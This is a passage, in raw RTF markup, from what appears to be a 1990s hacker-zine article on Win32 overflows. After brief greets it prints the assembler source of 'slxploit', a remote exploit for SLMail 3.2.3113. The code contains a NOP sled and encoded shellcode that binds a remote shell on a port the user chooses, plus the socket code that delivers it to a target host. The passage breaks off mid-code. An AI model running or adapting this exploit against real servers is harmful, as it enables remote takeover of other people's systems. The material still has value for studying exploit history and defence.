\endash \hich\af1\dbch\af28\loch\f1  trust\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 me, there is a lot hiding behind the bloat.
\par 
\par \hich\af1\dbch\af28\loch\f1 Navigate the code, work those registers, and you'll come up trumps -\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 guaranteed.
\par 
\par \hich\af1\dbch\af28\loch\f1 Fight those who try to outlaw our methods, support the \hich\af1\dbch\af28\loch\f1 open source\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 movement, and support full disclosure - it is a good thing.
\par 
\par \hich\af1\dbch\af28\loch\f1 "One future.  Two choices.  Oppose them or let them destroy us."
\par 
\par \hich\af1\dbch\af28\loch\f1 -Propagandhi.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Greets and thanks.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 neophyte, Greg Hoglund, c33, sacX, tree, casper, ripper, ryan\hich\af1\dbch\af28\loch\f1 , luny,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 sycotic, blitz, marc, Interrupt, ambient empire, DilDog, the beavuh &
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 mulysa crew, the eEye team, the rootkit crew, attrition, w00w00, L0pht,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
ADM, Phrack, Security Focus, technotronic, HNN, Packet Storm Security.. \hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 and everyone else I forgot.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 The\hich\af1\dbch\af28\loch\f1  Code.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 The assembler source code follows, and the shellcode for the exploit in c\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 format if anyone wishes to port.
\par 
\par \hich\af1\dbch\af28\loch\f1 <++> P55/Win32-overflows/slxploit.asm !e7b4ebd0
\par \hich\af1\dbch\af28\loch\f1 ;-------(code)-------------------------------------------------------------
\par 
\par \hich\af1\dbch\af28\loch\f1 ; This is just a shell from an old exploit of mine, so the code is somewhat 
\par \hich\af1\dbch\af28\loch\f1 ; dodgy - and no real error checking.
\par \hich\af1\dbch\af28\loch\f1 ; Live with it.
\par \hich\af1\dbch\af28\loch\f1 ;
\par \hich\af1\dbch\af28\loch\f1 ; The binary is available at http://www.beavuh.org.
\par \hich\af1\dbch\af28\loch\f1 ;
\par \hich\af1\dbch\af28\loch\f1 ; To assemble:
\par \hich\af1\dbch\af28\loch\f1 ;
\par \hich\af1\dbch\af28\loch\f1 ; tasm32 -ml slxploit.asm
\par \hich\af1\dbch\af28\loch\f1 ; tlink32 -Tpe -c -x sxlpl\hich\af1\dbch\af28\loch\f1 oit.obj ,,, import32
\par \hich\af1\dbch\af28\loch\f1 ;
\par \hich\af1\dbch\af28\loch\f1 ; TASM 5 required!
\par \hich\af1\dbch\af28\loch\f1 ;
\par \hich\af1\dbch\af28\loch\f1 ; dark spyrit / barnaby jack <dspyrit@beavuh.org>
\par 
\par 
\par \hich\af1\dbch\af28\loch\f1 .386p
\par \hich\af1\dbch\af28\loch\f1 locals
\par \hich\af1\dbch\af28\loch\f1 jumps
\par \hich\af1\dbch\af28\loch\f1 .model flat, stdcall
\par 
\par 
\par \hich\af1\dbch\af28\loch\f1 extrn GetCommandLineA:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn GetStdHandle:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn WriteConsoleA:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn ExitProcess:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn WSAStartup:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn connect:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn send:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn recv:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn WSACleanup:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn gethostbyname:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn htons:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn socket:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn inet_addr:PROC
\par \hich\af1\dbch\af28\loch\f1 extrn closesocket:PROC
\par 
\par \hich\af1\dbch\af28\loch\f1 .data
\par \hich\af1\dbch\af28\loch\f1 sploit_length           equ     851
\par 
\par \hich\af1\dbch\af28\loch\f1 sploit:
\par \hich\af1\dbch\af28\loch\f1  db 0\hich\af1\dbch\af28\loch\f1 65h, 078h, 070h, 06eh, 020h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 09\hich\af1\dbch\af28\loch\f1 0h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090\hich\af1\dbch\af28\loch\f1 h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h\hich\af1\dbch\af28\loch\f1 , 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h,\hich\af1\dbch\af28\loch\f1  090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090\hich\af1\dbch\af28\loch\f1 h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h\hich\af1\dbch\af28\loch\f1 , 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 090h, 090h, 0ebh, 007h, 090h, 0aah, 01ch, 09ch, 077h, 090h, 090h, 090h
\par \hich\af1\dbch\af28\loch\f1  db 033h, 0c0h, 050h, 0f7h, 0d0h, 050h, 059h, 0f2h, 0afh, 059h, 0b1h, 0c6h
\par \hich\af1\dbch\af28\loch\f1  db 08\hich\af1\dbch\af28\loch\f1 bh, 0c7h, 048h, 080h, 030h, 099h, 0e2h, 0fah, 033h, 0f6h, 096h, 0bbh
\par \hich\af1\dbch\af28\loch\f1  db 099h, 010h, 011h, 044h, 0c1h, 0ebh, 008h, 056h, 0ffh, 013h, 08bh, 0d0h
\par \hich\af1\dbch\af28\loch\f1  db 0fch, 033h, 0c9h, 0b1h, 00bh, 049h, 032h, 0c0h, 0ach, 084h, 0c0h, 075h
\par \hich\af1\dbch\af28\loch\f1  db 0f9h, 052h, 051h, 056h, 052h, 0b3\hich\af1\dbch\af28\loch\f1 h, 00ch, 0ffh, 013h, 0abh, 059h, 05ah
\par \hich\af1\dbch\af28\loch\f1  db 0e2h, 0ech, 032h, 0c0h, 0ach, 084h, 0c0h, 075h, 0f9h, 0b3h, 010h, 056h
\par \hich\af1\dbch\af28\loch\f1  db 0ffh, 013h, 08bh, 0d0h, 0fch, 033h, 0c9h, 0b1h, 006h, 032h, 0c0h, 0ach
\par \hich\af1\dbch\af28\loch\f1  db 084h, 0c0h, 075h, 0f9h, 052h, 051h, 056h, 052h, 0b3h, 00ch, 0ffh\hich\af1\dbch\af28\loch\f1 , 013h
\par \hich\af1\dbch\af28\loch\f1  }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 db 0abh, 059h, 05ah, 0e2h, 0ech, 083h, 0c6h, 005h, 033h, 0c0h, 050h, 040h
\par \hich\af1\dbch\af28\loch\f1  db 050h, 040h, 050h, 0ffh, 057h, 0e8h, 093h, 06ah, 010h, 056h, 053h, 0ffh
\par \hich\af1\dbch\af28\loch\f1  db 057h, 0ech, 06ah, 002h, 053h, 0ffh, 057h, 0f0h, 033h, 0c0h, 057h, 050h
\par \hich\af1\dbch\af28\loch\f1  db 0b0h, 00ch, 0abh, 05\hich\af1\dbch\af28\loch\f1 8h, 0abh, 040h, 0abh, 05fh, 048h, 050h, 057h, 056h
\par \hich\af1\dbch\af28\loch\f1  db 0adh, 056h, 0ffh, 057h, 0c0h, 048h, 050h, 057h, 0adh, 056h, 0adh, 056h
\par \hich\af1\dbch\af28\loch\f1  db 0ffh, 057h, 0c0h, 048h, 0b0h, 044h, 089h, 007h, 057h, 0ffh, 057h, 0c4h
\par \hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 db 033h, 0c0h, 08bh, 046h, 0f4h, 089h, 047h, 03ch, 089h, 047h, 040h, 08bh
\par \hich\af1\dbch\af28\loch\f1  db 006h, 089h, 047h, 038h, 033h, 0c0h, 066h, 0b8h, 001h, 001h, 089h, 047h
\par \hich\af1\dbch\af28\loch\f1  db 02ch, 057h, 057h, 033h, 0c0h, 050h, 050h, 050h, 040h, 050h, 048h, 050h
\par \hich\af1\dbch\af28\loch\f1  db 050h, 0adh, 056h, 033h, 0c0h\hich\af1\dbch\af28\loch\f1 , 050h, 0ffh, 057h, 0c8h, 0ffh, 076h, 0f0h
\par \hich\af1\dbch\af28\loch\f1  db 0ffh, 057h, 0cch, 0ffh, 076h, 0fch, 0ffh, 057h, 0cch, 048h, 050h, 050h
\par \hich\af1\dbch\af28\loch\f1  db 053h, 0ffh, 057h, 0f4h, 08bh, 0d8h, 033h, 0c0h, 0b4h, 004h, 050h, 0c1h
\par \hich\af1\dbch\af28\loch\f1  db 0e8h, 004h, 050h, 0ffh, 057h, 0d4h, 08bh, 0f0h, 033h, 0c0h,\hich\af1\dbch\af28\loch\f1  08bh, 0c8h
\par \hich\af1\dbch\af28\loch\f1  }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 db 0b5h, 004h, 050h, 050h, 057h, 051h, 050h, 0ffh, 077h, 0a8h, 0ffh, 057h
\par \hich\af1\dbch\af28\loch\f1  db 0d0h, 083h, 03fh, 001h, 07ch, 022h, 033h, 0c0h, 050h, 057h, 0ffh, 037h
\par \hich\af1\dbch\af28\loch\f1  db 056h, 0ffh, 077h, 0a8h, 0ffh, 057h, 0dch, 00bh, 0c0h, 074h, 02fh, 033h
\par \hich\af1\dbch\af28\loch\f1  db 0c0h, 050h, 0ff\hich\af1\dbch\af28\loch\f1 h, 037h, 056h, 053h, 0ffh, 057h, 0f8h, 06ah, 050h, 0ffh
\par \hich\af1\dbch\af28\loch\f1  }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 db 057h, 0e0h, 0ebh, 0c8h, 033h, 0c0h, 050h, 0b4h, 004h, 050h, 056h, 053h
\par \hich\af1\dbch\af28\loch\f1  db 0ffh, 057h, 0fch, 057h, 033h, 0c9h, 051h, 050h, 056h, 0ffh, 077h, 0ach
\par \hich\af1\dbch\af28\loch\f1  db 0ffh, 057h, 0d8h, 06ah, 050h, 0ffh, 057h, 0e0h\hich\af1\dbch\af28\loch\f1 , 0ebh, 0aah, 050h, 0ffh
\par \hich\af1\dbch\af28\loch\f1  db 057h, 0e4h, 090h, 0d2h, 0dch, 0cbh, 0d7h, 0dch, 0d5h, 0aah, 0abh, 099h
\par \hich\af1\dbch\af28\loch\f1  db 0dah, 0ebh, 0fch, 0f8h, 0edh, 0fch, 0c9h, 0f0h, 0e9h, 0fch, 099h, 0deh
\par \hich\af1\dbch\af28\loch\f1  db 0fch, 0edh, 0cah, 0edh, 0f8h, 0ebh, 0edh, 0ech, 0e9h, 0d0h, 0f7h, 0ffh
\par \hich\af1\dbch\af28\loch\f1  db 0f\hich\af1\dbch\af28\loch\f1 6h, 0d8h, 099h, 0dah, 0ebh, 0fch, 0f8h, 0edh, 0fch, 0c9h, 0ebh, 0f6h
\par \hich\af1\dbch\af28\loch\f1  db 0fah, 0fch, 0eah, 0eah, 0d8h, 099h, 0dah, 0f5h, 0f6h, 0eah, 0fch, 0d1h
\par \hich\af1\dbch\af28\loch\f1  db 0f8h, 0f7h, 0fdh, 0f5h, 0fch, 099h, 0c9h, 0fch, 0fch, 0f2h, 0d7h, 0f8h
\par \hich\af1\dbch\af28\loch\f1  db 0f4h, 0fch, 0fdh, 0c9h, 0f0h, 0e9\hich\af1\dbch\af28\loch\f1 h, 0fch, 099h, 0deh, 0f5h, 0f6h, 0fbh
\par \hich\af1\dbch\af28\loch\f1  db 0f8h, 0f5h, 0d8h, 0f5h, 0f5h, 0f6h, 0fah, 099h, 0ceh, 0ebh, 0f0h, 0edh
\par \hich\af1\dbch\af28\loch\f1  db 0fch, 0dfh, 0f0h, 0f5h, 0fch, 099h, 0cbh, 0fch, 0f8h, 0fdh, 0dfh, 0f0h
\par \hich\af1\dbch\af28\loch\f1  db 0f5h, 0fch, 099h, 0cah, 0f5h, 0fch, 0fch, 0e9h, 099h, 0dch, 0e1h\hich\af1\dbch\af28\loch\f1 , 0f0h
\par \hich\af1\dbch\af28\loch\f1  db 0edh, 0c9h, 0ebh, 0f6h, 0fah, 0fch, 0eah, 0eah, 099h, 0ceh, 0cah, 0d6h
\par \hich\af1\dbch\af28\loch\f1  db 0dah, 0d2h, 0aah, 0abh, 099h, 0eah, 0f6h, 0fah, 0f2h, 0fch, 0edh, 099h
\par \hich\af1\dbch\af28\loch\f1  db 0fbh, 0f0h, 0f7h, 0fdh, 099h, 0f5h, 0f0h, 0eah, 0edh, 0fch, 0f7h, 099h
\par \hich\af1\dbch\af28\loch\f1  db 0f8h, 0fah, 0fah, 0f\hich\af1\dbch\af28\loch\f1 ch, 0e9h, 0edh, 099h, 0eah, 0fch, 0f7h, 0fdh, 099h
\par \hich\af1\dbch\af28\loch\f1  db 0ebh, 0fch, 0fah, 0efh, 099h, 09bh, 099h 
\par \hich\af1\dbch\af28\loch\f1  }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 store dw ? 
\par \hich\af1\dbch\af28\loch\f1  db 099h, 099h, 099h
\par \hich\af1\dbch\af28\loch\f1  db 099h, 099h, 099h, 099h, 099h, 099h, 099h, 099h, 099h, 0fah, 0f4h, 0fdh
\par \hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 db 0b7h, 0fch, 0e1h, 0fch, 099h, 0ffh, 0ffh, 0ffh, 0ffh, 00dh, 00ah  
\par 
\par \hich\af1\dbch\af28\loch\f1 logo  db "SLMail (3.2.3113) remote.", 13, 10
\par \hich\af1\dbch\af28\loch\f1       db "by dark spyrit aka Barnaby Jack <dspyrit@beavuh.org>",13,10,13,10
\par \hich\af1\dbch\af28\loch\f1       db "usage: slxploit <host> <port> <port to bind shell>", 1\hich\af1\dbch\af28\loch\f1 3, 10
\par \hich\af1\dbch\af28\loch\f1       db "eg - slxploit host.com 27 1234",13,10,0
\par \hich\af1\dbch\af28\loch\f1       logolen equ $-logo
\par 
\par 
\par \hich\af1\dbch\af28\loch\f1 errorinit db 10,"error initializing winsock.", 13, 10, 0
\par \hich\af1\dbch\af28\loch\f1 errorinitl equ $-errorinit
\par 
\par \hich\af1\dbch\af28\loch\f1 derror  db 10,"error.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 derrorl equ $-derror
\par 
\par \hich\af1\dbch\af28\loch\f1 nohost db 10,"no host or ip specifi\hich\af1\dbch\af28\loch\f1 ed.", 13,10,0
\par \hich\af1\dbch\af28\loch\f1 nohostl equ $-nohost
\par 
\par \hich\af1\dbch\af28\loch\f1 noport db 10,"no port specified.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 noportl equ $-noport
\par 
\par \hich\af1\dbch\af28\loch\f1 no_port2 db 10,"no bind port specified.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 no_port2l equ $-no_port2
\par 
\par \hich\af1\dbch\af28\loch\f1 response db 10,"waiting for response....",13,10,0
\par \hich\af1\dbch\af28\loch\f1 respl   equ $-response
\par 
\par \hich\af1\dbch\af28\loch\f1 reshost db 10,"error resolving host.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 reshostl equ $-reshost
\par 
\par \hich\af1\dbch\af28\loch\f1 sockerr db 10,"error creating socket.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 sockerrl equ $-sockerr
\par 
\par \hich\af1\dbch\af28\loch\f1 ipill   db 10,"ip error.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 ipilll   equ $-ipill
\par 
\par \hich\af1\dbch\af28\loch\f1 cnerror db 10,"error establishing connection.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 cner\hich\af1\dbch\af28\loch\f1 rorl equ $-cnerror
\par 
\par \hich\af1\dbch\af28\loch\f1 success db 10,"sent.. spawn connection now.",13,10,0
\par \hich\af1\dbch\af28\loch\f1 successl equ $-success
\par 
\par \hich\af1\dbch\af28\loch\f1 console_in      dd      ?
\par \hich\af1\dbch\af28\loch\f1 console_out     dd      ?
\par \hich\af1\dbch\af28\loch\f1 bytes_read      dd      ?
\par 
\par \hich\af1\dbch\af28\loch\f1 wsadescription_len equ 256
\par \hich\af1\dbch\af28\loch\f1 wsasys_status_len equ 128
\par 
\par \hich\af1\dbch\af28\loch\f1 WSAdata struct
\par \hich\af1\dbch\af28\loch\f1 wVersion dw\hich\af1\dbch\af28\loch\f1  ?
\par \hich\af1\dbch\af28\loch\f1 wHighVersion dw ?
\par \hich\af1\dbch\af28\loch\f1 szDescription db wsadescription_len+1 dup (?)
\par \hich\af1\dbch\af28\loch\f1 szSystemStatus db wsasys_status_len+1 dup (?)
\par \hich\af1\dbch\af28\loch\f1 iMaxSockets dw ?
\par \hich\af1\dbch\af28\loch\f1 iMaxUdpDg dw ?
\par \hich\af1\dbch\af28\loch\f1 lpVendorInfo dw ?
\par \hich\af1\dbch\af28\loch\f1 WSAdata ends
\par 
\par \hich\af1\dbch\af28\loch\f1 sockaddr_in struct
\par \hich\af1\dbch\af28\loch\f1 sin_family dw ?
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 sin_port dw ?
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 sin_addr dd ?
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 sin_zero db 8 dup (0)
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 sockaddr_in ends
\par 
\par \hich\af1\dbch\af28\loch\f1 wsadata WSAdata <?>
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 sin sockaddr_in <?>
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 sock dd ?
\par \hich\af1\dbch\af28\loch\f1 numbase dd 10
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 _port db 256 dup (?)
\par \hich\af1\dbch\af28\loch\f1 _host db 256 dup (?)
\par \hich\af1\dbch\af28\loch\f1 _port2 db 256 dup (?)
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 buffer db 1000 dup (0)
\par 
\par \hich\af1\dbch\af28\loch\f1 .code
\par \hich\af1\dbch\af28\loch\f1 start:
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 call    init_console
\par \tab \hich\af1\dbch\af28\loch\f1 push    logolen
\par \tab \hich\af1\dbch\af28\loch\f1 push    of\hich\af1\dbch\af28\loch\f1 fset logo
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 call    GetCommandLineA
\par \tab \hich\af1\dbch\af28\loch\f1 mov     edi, eax
\par \tab \hich\af1\dbch\af28\loch\f1 mov     ecx, -1
\par \tab }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 xor     al, al
\par \tab \hich\af1\dbch\af28\loch\f1 push    edi
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 repnz   scasb
\par \tab \hich\af1\dbch\af28\loch\f1 not     ecx
\par \tab \hich\af1\dbch\af28\loch\f1 pop     edi
\par \tab \hich\af1\dbch\af28\loch\f1 mov     al, 20h
\par \tab \hich\af1\dbch\af28\loch\f1 repnz   scasb
\par \tab \hich\af1\dbch\af28\loch\f1 dec     ecx
\par \tab \hich\af1\dbch\af28\loch\f1 cmp     ch, 0ffh
\par \tab \hich\af1\dbch\af28\loch\f1 jz      @@0
\par \tab \hich\af1\dbch\af28\loch\f1 test    ecx, ecx
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     @@1
\par \hich\af1\dbch\af28\loch\f1 @@0:        
\par \tab \hich\af1\dbch\af28\loch\f1 push    nohostl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset nohost
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit3
\par \hich\af1\dbch\af28\loch\f1 @@1:
\par \tab \hich\af1\dbch\af28\loch\f1 mov     esi, edi
\par \tab \hich\af1\dbch\af28\loch\f1 lea     edi, _host
\par \tab \hich\af1\dbch\af28\loch\f1 call    parse
\par \tab \hich\af1\dbch\af28\loch\f1 or      ecx, ecx
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     @@2
\par \tab \hich\af1\dbch\af28\loch\f1 push    noportl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset noport
\par \tab \hich\af1\dbch\af28\loch\f1 call \hich\af1\dbch\af28\loch\f1    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit3
\par \hich\af1\dbch\af28\loch\f1 @@2:
\par \tab \hich\af1\dbch\af28\loch\f1 lea     edi, _port
\par \tab \hich\af1\dbch\af28\loch\f1 call    parse
\par \tab \hich\af1\dbch\af28\loch\f1 or      ecx, ecx
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     @@3
\par \tab \hich\af1\dbch\af28\loch\f1 push    no_port2l
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset no_port2
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit3
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 @@3:
\par \tab \hich\af1\dbch\af28\loch\f1 push    ecx
\par \tab \hich\af1\dbch\af28\loch\f1 lea     edi, _port2
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 call    parse
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset wsadata
\par \tab \hich\af1\dbch\af28\loch\f1 push    0101h
\par \tab \hich\af1\dbch\af28\loch\f1 call    WSAStartup
\par \tab \hich\af1\dbch\af28\loch\f1 or      eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 jz      winsock_found
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 push    errorinitl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset errorinit
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit3
\par 
\par \hich\af1\dbch\af28\loch\f1 winsock_found:
\par \tab \hich\af1\dbch\af28\loch\f1 xor     eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 inc     eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 inc     eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 call    socket
\par \tab \hich\af1\dbch\af28\loch\f1 cmp     eax, -1
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     socket_ok
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 push    sockerrl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset sockerr
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit2
\par 
\par \hich\af1\dbch\af28\loch\f1 socket_ok:
\par \tab \hich\af1\dbch\af28\loch\f1 mov     sock, eax
\par \tab \hich\af1\dbch\af28\loch\f1 mov     sin.sin_family, 2
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 mov     ebx, offset _port
\par \tab \hich\af1\dbch\af28\loch\f1 call    \hich\af1\dbch\af28\loch\f1 str2num
\par \tab \hich\af1\dbch\af28\loch\f1 mov     eax, edx
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 call    htons
\par \tab \hich\af1\dbch\af28\loch\f1 mov     sin.sin_port, ax
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 mov     ebx, offset _port2
\par \tab \hich\af1\dbch\af28\loch\f1 call    str2num
\par \tab \hich\af1\dbch\af28\loch\f1 mov     eax, edx
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 call    htons
\par \tab \hich\af1\dbch\af28\loch\f1 xor     ax, 09999h
\par \tab \hich\af1\dbch\af28\loch\f1 mov     store, ax
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 mov     esi, offset _host
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 lewp:
\par \tab \hich\af1\dbch\af28\loch\f1 xor     al, al
\par \tab \hich\af1\dbch\af28\loch\f1 lodsb
\par \tab \hich\af1\dbch\af28\loch\f1 cmp     al, 039h
\par \tab \hich\af1\dbch\af28\loch\f1 ja      gethost
\par \tab \hich\af1\dbch\af28\loch\f1 test    al, al
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 jnz     lewp
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset _host
\par \tab \hich\af1\dbch\af28\loch\f1 call    inet_addr
\par \tab \hich\af1\dbch\af28\loch\f1 cmp     eax, -1
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     ip_aight
\par \tab \hich\af1\dbch\af28\loch\f1 push    ipilll
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset ipill
